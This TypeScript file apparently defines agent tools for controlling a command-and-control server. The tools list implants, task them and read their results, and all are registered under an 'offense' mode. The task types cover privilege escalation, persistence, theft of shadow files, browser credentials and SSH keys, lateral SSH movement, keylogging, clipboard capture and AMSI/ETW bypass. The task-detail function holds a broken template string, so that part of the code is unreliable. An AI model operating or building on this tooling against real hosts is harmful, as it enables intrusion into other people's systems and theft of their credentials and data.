import { tool } from "ai";
import { z } from "zod";
import { registerTool } from "../mode.js";
import { C2Client, resolveClientConfig } from "./client/api.js";
import type { ToolResult } from "../types.js";

let client: C2Client | null = null;

function getClient(): C2Client {
  if (!client) {
    const cfg = resolveClientConfig(
      process.env.C2_SERVER_URL,
      process.env.C2_API_KEY,
    );
    client = new C2Client(cfg);
  }
  return client;
}

/**
 * List all registered implants in the reach.
 */
export function createC2ReachTool() {
  return tool({
    description: "List all registered C2 implants — active, dead, destroyed counts and last-seen timestamps.",
    inputSchema: z.object({}),
    execute: async (): Promise<ToolResult> => {
      try {
        const summary = await getClient().reach();
        const lines = [`Total: ${summary.total} | Active: ${summary.active} | Dead: ${summary.dead}`];
        for (const imp of summary.implants) {
          lines.push(`  ${imp.id}  ${imp.status}  last: ${imp.lastSeen}`);
        }
        return { success: true, data: lines.join("\n") };
      } catch (err) {
        return { success: false, data: "", error: `reach failed: ${(err as Error).message}` };
      }
    },
  });
}

/**
 * Create a task for an implant.
 */
export function createC2TaskCreateTool() {
  return tool({
    description: "Create a new task for a C2 implant. The implant will pick it up on its next beacon and execute it.",
    inputSchema: z.object({
      implantId: z.string().min(1).describe("Implant ID to target"),
      type: z.string().min(1).describe("Task type: recon_processes, recon_network, recon_users, recon_cron, recon_suid, recon_all, privesc_sudo, privesc_writable, privesc_kernel, privesc_all, persistence_ssh, persistence_startup, persistence_all, exploit_packages, exploit_services, exploit_all, monitor_fim, monitor_rootkit, monitor_all, brute_sudo, brute_ssh, brute_local, brute_all, credential_shadow, credential_browsers, credential_ssh_keys, credential_configs, credential_all, lateral_ssh, lateral_all, collect_keylog, collect_screenshot, collect_clipboard, collect_all, bypass_amsi, bypass_etw, bypass_all"),
      params: z.record(z.unknown()).optional().describe("Optional task parameters as JSON object"),
    }),
    execute: async (input: { implantId: string; type: string; params?: Record<string, unknown> }): Promise<ToolResult> => {
      try {
        const task = await getClient().taskCreate({
          implantId: input.implantId,
          type: input.type,
          params: input.params ?? {},
        });
        return {
          success: true,
          data: `Task created: ${task.taskId}\nType: ${task.type}\nStatus: ${task.status}\nCreated: ${task.createdAt}`,
        };
      } catch (err) {
        return { success: false, data: "", error: `task create failed: ${(err as Error).message}` };
      }
    },
  });
}

/**
 * List tasks for an implant.
 */
export function createC2TaskListTool() {
  return tool({
    description: "List tasks for a C2 implant. Shows status (pending/completed/failed) and timestamps.",
    inputSchema: z.object({
      implantId: z.string().min(1).describe("Implant ID to list tasks for"),
    }),
    execute: async (input: { implantId: string }): Promise<ToolResult> => {
      try {
        const tasks = await getClient().taskList(input.implantId);
        if (tasks.length === 0) {
          return { success: true, data: "No tasks found for this implant." };
        }
        const lines = [`${tasks.length} task(s):`];
        for (const t of tasks) {
          const result = t.result?.data ? ` (${t.result.data.slice(0, 80).replace(/\n/g, " ")})` : "";
          lines.push(`  ${t.taskId.slice(0, 8)}  ${t.type.padEnd(20)}  ${t.status.padEnd(12)}  ${t.createdAt}${result}`);
        }
        return { success: true, data: lines.join("\n") };
      } catch (err) {
        return { success: false, data: "", error: `task list failed: ${(err as Error).message}` };
      }
    },
  });
}

/**
 * Get detailed task result.
 */
export function createC2TaskDetailTool() {
  return tool({
    description: "Get full details and result output for a specific C2 task. Use this to read completed recon/exploit output.",
    inputSchema: z.object({
      taskId: z.string().min(1).describe("Task ID to get details for"),
    }),
    execute: async (input: { taskId: string }): Promise<ToolResult> => {
      try {
        const task = await getClient().taskDetail(input.taskId);
        const lines = [
          `Task:    ${task.taskId}`,
          `Implant: ${task.implantId}`,
          `Type:    ${task.type}`,
          `Status:  ${task.status}`,
          `Params:  ${JSON.stringify(task.params)}`,
          `Created: ${task.createdAt}`,
        ];
        if (task.deliveredAt) lines.push(`Delivered: ${task.deliveredAt}`);
        if (task.completedAt) lines.push(`Completed: ${task.completedAt}`);
        if (task.result) {
          lines.push(`");
--- Result ---`);
          lines.push(`Success: ${task.result.success}`);
          if (task.result.data) lines.push(task.result.data.slice(0, 5000));
          if (task.result.error) lines.push(`Error: ${task.result.error}`);
          if (task.result.analysis) lines.push(`\n--- AI Analysis ---\n${task.result.analysis}`);
        }
        return { success: true, data: lines.join("\n") };
      } catch (err) {
        return { success: false, data: "", error: `task detail failed: ${(err as Error).message}` };
      }
    },
  });
}

/**
 * Cancel a pending task.
 */
export function createC2TaskCancelTool() {
  return tool({
    description: "Cancel a pending C2 task before the implant picks it up.",
    inputSchema: z.object({
      taskId: z.string().min(1).describe("Task ID to cancel"),
    }),
    execute: async (input: { taskId: string }): Promise<ToolResult> => {
      try {
        const ok = await getClient().taskCancel(input.taskId);
        return {
          success: true,
          data: ok ? `Task ${input.taskId.slice(0, 8)} cancelled.` : "Task not found or already completed.",
        };
      } catch (err) {
        return { success: false, data: "", error: `cancel failed: ${(err as Error).message}` };
      }
    },
  });
}

/**
 * Send self-destruct to an implant.
 */
export function createC2KillTool() {
  return tool({
    description: "Send self-destruct command to a C2 implant. The implant will remove its persistence, wipe its binary, and clean up.",
    inputSchema: z.object({
      implantId: z.string().min(1).describe("Implant ID to self-destruct"),
    }),
    execute: async (input: { implantId: string }): Promise<ToolResult> => {
      try {
        const taskId = await getClient().implantKill(input.implantId);
        return {
          success: true,
          data: `Self-destruct queued for ${input.implantId}. Task: ${taskId}. Implant will wipe on next beacon.`,
        };
      } catch (err) {
        return { success: false, data: "", error: `kill failed: ${(err as Error).message}` };
      }
    },
  });
}

// ---------------------------------------------------------------------------
// Register all C2 tools for offense mode
// ---------------------------------------------------------------------------

registerTool("c2_reach", "offense");
registerTool("c2_task_create", "offense");
registerTool("c2_task_list", "offense");
registerTool("c2_task_detail", "offense");
registerTool("c2_task_cancel", "offense");
registerTool("c2_kill", "offense");
